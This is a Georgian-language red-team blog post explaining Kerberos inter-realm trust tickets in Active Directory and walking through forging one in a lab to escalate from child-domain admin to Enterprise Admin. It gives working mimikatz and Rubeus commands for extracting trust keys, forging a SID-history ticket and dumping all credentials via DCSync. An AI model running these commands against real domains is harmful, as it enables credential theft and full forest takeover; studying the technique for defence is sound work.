---
title: "Forest Compromise - Forging IR-TGT Tickets (1 ნაწილი)"
date: 2023-06-05T01:38:06+04:00
draft: false
---
![Untitled](/images/forest/main-logo.jpg)

```
“კაცი, რომ Domain Admin იქნება, ის Enterprise Admin - იც გახდებაო”
    
    -   ნათქვამია ნერდულ ანდაზაში.
```
## [0x00] შესავალი

მიჩნეულია, რომ **Active Directory** გარემოში, 1 forest - ში არსებული ნებისმიერი დომეინზე ჰაკერის მიერ მოპოვებული Domain Admin წვდომა მხოლოდ ვრცელდება იმ კონკრეტულ დომეინზე, რაც შეცდომაა. მნიშვნელობა არ აქვს რამდენად ჩაშლილი სტრუქტურაა, მაგალითად **grandgrandchild.grandchild.child.redefense.local** დომეინის კომპრომიზირების შემთხვევაში მთლიანად **redefense.local** არის “გაწეული”. რადგანაც ფორესტში დომეინებს შორის არის ყოველთვის 2 მხრივი ტრანზიტული ნდობა (2 way implicit transitive trust).
<!--more-->
თუმცა სხვა სიტუაცია გვაქვს როცა 2 forest გვაქვს. აქ იგივე პრინციპი არ ვრცელდება რადგანაც microsoft - ის სიტყვებით, AD ში security boundary ანუ საზღვარი არის არა დომეინები, არამედ AD Forest.

## [0x01] Active Directory 101

მთავარ AD დომეინს, რომელიც პირველად იქმნება AD forest - ში ქვია "forest root domain". ამ შემთხვევაში ჩვენ გვაქვს root domain: "**redefense.local**". ქვემოთა ორი დომეინი არის შვილობილი დომეინები და ბოლოვდება .redefense.local - ით.

![Untitled](/images/forest/Untitled.png)

AD Forest - ში მშობელ-შვილობილ დომეინებს შორის ყოველთვის არის 2 მხრივი trust, რომელიც თავისთავად იქმნება ანუ არის **implicit trust** თავიდანვე.     აღსანიშნავია, რომ root domain საც და მთლიან forest - ს ეძახიან ერთიდაიგივე სახელს და ეს იქნება: **redefense.local**

როდესაც შვილობილ დომეინს სურს რომ მიწვდეს მაგალითად მშობელ დომეინში არსებულ სერვისს, ამისათვის საჭიროა **IR-TGT (Inter-Realm TGT)** - ს დაგენერირება ამას ეძახიან ასევე referral ticket - ს. ეს ე.წ **IR-TGT** არის დაშიფრული და იგი იშიფრება ე.წ “**trust key**” - ით (განსხვავებით TGT სგან რომელიც იშიფრება **krbtgt** იუზერის პაროლის ჰეშით), რომელიც გენერირდება როდესაც ვქმნით შვილობილ დომეინებს.

იმისათვის, რომ სრულად გავიგოთ ხსენებული დეტალები ვნახოთ 1 კონკრეტული დომეინის მაგალითზე როგორ ხდება სერვისზე წვდომის დამყარება.

თუკი AD დომეინში აუთენტიფიკაციის დროს ხდება **kerberos** პროტოკოლის გამოყენება, ყველაფერი ხდება ე.წ ticket - ების (TGT,  TGS) გამოყენებით.

![Untitled](/images/forest/Untitled%201.png)

1. **timestamp** იშიფრება დომეინ იუზერის პაროლის NTLM ჰეშით და იგზავნება KDC სთან.(ზოგჯერ შეილება დაიშიფროს სხვანაირად თუ AD CS იქნება საქმეში, ამაზე მოგვიანებით პოსტებში ვისაუბრებთ)

2. რადგან დომეინ კონტროლერს აქვს იუზერის ჰეში, იგი დეკრიპტაციას უკეთებს **AS-REQ** - ს და ამოიღებს timestamp - ს. მნიშვნელოვანია, რომ timestamp არიყოს 5 წუთზე მეტი რაოდენობით აცდენილი, რომელიც არის დეფაულტად AD - ში. დომეინ კონტროლერი ჩათვლის, რომ იუზერი ითხოვს TGT - ს და აგზავნის მას, თუმცა სანამ გააგზავნის მას შიფრავს **krbtgt** იუზერის პაროლის ჰეშით და ამ TGT - ს ნახვა შეუძლია მხოლოდ და მხოლოდ დომეინ კონტროლერს, რადგან მხოლოდ მას აქვს **krbtgt** იუზერის ჰეში. TGT - ში წერია იუზერი, მისი SID(და ეს ჩაწერილია PAC სტრუქტურაში), ჯგუფი სადაც იგი იმყოფება და ა.შ.
    1. აღსანიშნავია, რომ TGT თიქეთში რაცარუნდა ჩავწეროთ მათ შორის დომეინ ადმინის იუზერი, დომეინ კონტროლერი ჩათვლის, რომ სწორად დომეინ ადმინს ეკუთვნის TGT, რადგან TGT - ს ვალიდაციის მხოლოდ 1 საშუალება აქვს და ეს არის თუკი გაუკეთებს დეშიფრაციას თიქეთს **krbtgt** იუზერის ჰეშით.
    2. ჩვენ, დამოუკიდებლად TGT - ში ვერ ჩავწერთ რასაც გვინდა იმას, რადგან როგორც უკვე მიხვდით გვჭირდება krbtgt იუზერის ჰეში. მოგვიანებით (სხვა პოსტში) შევეხებით Golden Ticket - ების შექმნას სადაც ფიგურირებს krbtgt + ასევე Diamond Ticket ების პრინციპსაც, რომელიც შედარებით ახალია.

3. TGT შეგილიათ ჩათვალოთ როგორც მოქალაქის პირადობის მოწმობა ან პასპორტი. ნებისმიერ სერვისს სანამ მიწვდებით საჭიროა ჯერ TGT წარადგინოთ და შემდგომ მოითხოვოთ სერვისზე წვდომა ანუ TGS ის მოთხოვნა. მესამე ეტაპზე იუზერი ითხოვს სერვისზე წვდომისთვის TGS - ს და აგზავნის მოთხოვნას ამასთან დაკავშირებით და თან აყოლებს თავის TGT - ს.
    1. მოთხოვნილი სერვისების ვარიანტები შეიძლება იყოს:
        1. ``Share`` - ებზე წვდომისთვის საჭიროა **CIFS** სერვისზე **TGS** ის მოთხოვნა
        2. ``WinRM`` (როცა ``PS Remoting`` - ის ვცდილობთ) - ზე მოთხოვნისთის საჭიროა **HTTP** სერვისზე TGS - ის მოთხოვნა
        3. ``WMI`` - ზე მოთხოვნისთვის საჭიროა **HOST** და **RPCSS** სერვისებზე TGS ის მოთხოვნა
        4. და ა.შ

4. დომეინ კონტროლერი შიფრავს TGS თიქეთს სერვისს ექაუნთის პაროლის ჰეშით. მაგალითად თუკი სერვისი რომელსაც გვინდა მივწვდეთ არის MSSQL, მაშინ დომეინ კონტროლერი შიფრავს TGS, იმ იუზერის ჰეშით, რომელიც გამოყენებულია MSSQL სერვისის გასაშვებად.
    1. თუკი საქმე ეხება CIFS სერვისს, მაშინ იგი იშიფრება ამ სერვერის ე.წ ``Machine Account`` - ის ჰეშით. მაგალითად თუკი სერვერის სახელია: ``srv1.redefense.local``, მაშინ დომეინ კონტროლერში არსებული machine account: **srv1$** - ის პაროლის ჰეში გამოყენებული იქნება TGS ის შიფრაციისთვის.
    2. აღსანიშნავია რომ ``machine account`` ების პაროლი არის random ად გენერირებული ავტომატურად და არის ძალიან გრძელი, შესაბამისად მის დაკრეკვაზე დროს ნუ დაკარგავთ. ამასთანავე იგი 30 დღეში რესეტდება.
    3. როდესაც სერვერზე არსებულ ისეთ დეფაულტ სერვისებზე როგორიცაა: **CIFS**, **HOST**, **RPCSS**, **LDAP** და ა.შ. ესენი არის არის გაშვებული **NT AUTHORITY/SYSTEM** - ით, შესაბამისად როცა საქმე ასეა მაშინ ერთვება საქმეში machine account ის ჰეში და TGS იშიფრება ამ ჰეშით.
        1. ეს დეტალი ძალზედ მნიშვნელოვანია როდესაც განვახორციელებთ ``Constrained Delegation`` - ზე დარტყმებს მომავალ პოსტში.


5. მეხუთე ეტაპზე უკვე იუზერს აქვს TGS და ახლა ცდილობს სერვისზე წვდომას და ამას აკეთებს სერვისისთვის TGS - ის გადაცემით (რომელიც დომეინ კონტროლერმა მისცა). TGS ში წერია იუზერის სახელი რომელსაც უნდა ავტორიზაციის გავლა.
    1. აღსანიშნავია, რომ მართალია TGS თიქეთი იუზერს აქვს მაგრამ შეილება მაინც ვერ გაიაროს ავტორიზაცია რადგან სერვისს ჰქონდეს ამ იუზერზე წვდომის შეზღუდვა.

6. TGS - ს მიცემის შემდგომ, სერვისმა დამატებით შესაძლოა კიდევ მოითხოვოს დამატებითი აუთენტიფიკაციები.

რაც შეეხება, ბოლო PAC სტრუქტურის ვალიდაციას, როგორც წესი ამას არავინ რთავს რადგან დომეინ კონტროლერი იტვირთება და დატვირთვა უფრო მეტი აქვს ვიდრე სარგებელი.

## [0x02] Inter-Realm TGT

ეხლა გავერკვეთ როგორ ხდება მეზობელ დომეინში არსებულ სერვისზე წვდომა. აქ მაგალითზე გვაქვს მოცემული ``child1.redefense.xyz`` და ``root domain`` ანუ მშობელი დომეინი.

![Untitled](/images/forest/Untitled%202.png)

1. ჩვეულებრივ იუზერი ითხოვს TGT - ის
2. ღებულობს TGT - ს
3. ითხოვს სერვისზე წვდომას, რომელიც მდებარეობს მშობელ დომეინში
4. დომეინ კონტროლერი ხვდება რომ სერვისი რომელსაც იუზერი ითხოვს (ამას ხვდება მოთხოვნილი SPN - ის მეშვეობით) მდებარეობს მეზობელ დომეინში. აბრუნებს ე.წ **Inter-Realm TGT** - ის, რომელიც დაშიფრულია trust key - ის მეშვეობით
5. იუზერი აკითხავს მეზობელ დომეინს და ითხოვს TGS სერვისისთვის და თან აყოლებს **IR-TGT** - ის
6. მშობელი დომეინის DC - ის შეულია დეკრიპტაცია გაუკეთოს **IR-TGT** თიქეთს რადგან მასაც აქვს იდენტური trust key და კითხულობს, რომ კონკრეტულ იუზერს სურს წვდომა მოიპოვოს სერვისზე რომელიც მდებარეობს SRV01 - ზე და ბოლოს აბრუნებს TGS თიქეთს, კლიენტისთვის
    1. ჩვენი პოსტი ეხება ამ საკითხს. მშობელი დომეინის DC - ს, IR-TGT - ის ვალიდაციის მხოლოდ 1 გზა აქვს, შეუძლია თუ არა მას მისი დეკრიპტაცია trust key მეშვეობით, თუკი იგი ამას მოახერხებს მაშინ IR-TGT ში ჩაწერილი იუზერი ვინც არუნდა იყოს მნიშვნელობა არ აქვს, იგი იმ ჩანაწერს ენდობა უკვე რაც ჩაწერილია **IR-TGT** ში.
7. კლიენტი წვდება SRV01 სერვერს

შვილობილ დომეინზე domain admin - ზე მოპოვების შემდგომ შეგვიძლია **SID History** მცნების გამოყენება რათა გავაკეთოთ პრივილეგიების ესკალაცია **Enterprise Admin** - ზე, რის შემდეგაც მთლიანად ფორესტი გაკონტროლდება.

შვილობილი დომეინ ადმინიდან **Root domain ის EA (Enterprise Admin)** - ზე ასვლისათვის არის 2 გზა

- უკვე ნახსენები **IR-TGT** - ების შექმნით (ე.წ “forged ticket”) სადაც ჩავწერთ **SID history** პარამეტრს.
- **krbtgt** ჰეშის გამოყენებით TGT ების შექმნით სადაც ჩავწერთ **SID history** პარამეტრს.

## [0x03] Forged IR-TGT

ამ სექციაში განვიხილავთ შვილობილი დომეინიდან child1.test.local, Enterprise Admin ის მოპოვებას.

ამისათვის დაგვიჭრდება შემდეგი რამ:

- Trust key
- და მიმდინარე დომეინის (child1.test.local) SID
- EA ჯგუფის SID

**Trust key** -  ს მიღება შესაძლებელია mimikatz ის დახმარებით, ხოლო მიმდინარე დომეინის SID - ს რაც შეეხება, შესაძლებელია მარტივად ამოვიღოთ 
```
Get-ADDomain
``` 
ბრძანებით.

პირველ რიგში, დავრწმუნდეთ რომ ვერ ვწვდებით მშობელი დომეინის ``DC`` ზე არსებულ ``C$`` შეარს

![Untitled](/images/forest/Untitled%203.png)

ასევე სურათზე ჩანს, რომ  ვართ **child1** - ის DA.


შემდგომ ეტაპზე ვიღებთ trust key - ს mimikatz - ის საშუალებით
```cmd
mimikatz # lsadump::trust /patch
```

**შენიშვნა**: ამ გზით ამოღება შეიცავს რისკებს, რადგან ხდება lsass.exe პროცესის მოდიფიკაცია რაც არის რისკის შემცველი.  სასურველია თუ აქ dcsync - ს გამოიყენებთ ამ ბრძანების ნაცვლად.

![Untitled](/images/forest/Untitled%204.png)


ავიღოთ მშობელი დომეინის Enterprise Admin ჯგუფის SID:

![Untitled](/images/forest/Untitled%205.png)


მიმდინარე დომეინის SID:

![Untitled](/images/forest/Untitled%206.png)

ვქმნით IR-TGT - ის mimikatz ის მეშვეობით:
```cmd
mimikatz # kerberos::golden /domain:child1.test.local /sid:S-1-5-21-335917780-3539237770-911515011 /sids:S-1-5-21-2262149426-912762142-519 /rc4:adb28e383cc67f99236699590ae0c0 /user: Administrator /service:krbtgt /target:test.local /ticket:C:\Users\Public\trust_tkt.kirbi
```
![Untitled](/images/forest/Untitled%207.png)


მშობელი დომეინის (test.local) დომეინ კონტროლერს ვაძლევთ ჩვენს trust_tkt.kirbi - ს და ვითხოვთ წვდომას cifs სერვისზე.
```cmd
./Rubeus.exe asktgs /ticket:C:\Users\Public\trust_tkt.kirbi /service:cifs/dc-1.test.local /dc:dc-1.test.local /ptt
```
![Untitled](/images/forest/Untitled%208.png)

Rubeus ხელსაწყოს პარამეტრი ``/ptt`` ნიშნავს მიმდინარე logon session - ში თიქეთის "ჩადება"
შემდგომ სქრინშოტზე ვხედავთ რომ გვაქვს TGS თიქეთი Administrator - ის იუზერით.

![Untitled](/images/forest/Untitled%209.png)


ასევე ჩვენ შეგვიძლია ``Rubeus.exe triage`` ბრძანებით ვნახოთ რა თიქეთები გვაქვს მემორიში და ასევე ვხედავთ ყველა logon session - ს.

![Untitled](/images/forest/Untitled%2010.png)

გავტესტოთ გვაქვს თუ არა წვდომა მშობელი დომეინის დომეინ კონტროლერზე:

![Untitled](/images/forest/Untitled%2011.png)


ვნახოთ ასევე თუ შეგვიძლია DCSync ოპერაციის განხორციელება

```cmd
mimikatz # lsadump::dcsync /all /csv /domain:test.local
```

![Untitled](/images/forest/Untitled%2014.png)

ეს იყო პირველი ნაწილი. მეორე ნაწილში შემოგთავაზებთ golden ticket - ების გამოყენებით ფორესტზე წვდომის მოპოვებას.